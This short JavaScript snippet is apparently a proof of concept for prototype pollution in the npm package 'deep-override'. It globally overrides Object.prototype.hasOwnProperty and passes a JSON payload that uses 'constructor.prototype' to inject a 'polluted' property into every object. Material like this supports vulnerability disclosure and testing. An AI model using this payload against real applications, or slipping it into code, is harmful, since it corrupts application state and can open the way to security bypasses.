Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride({}, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);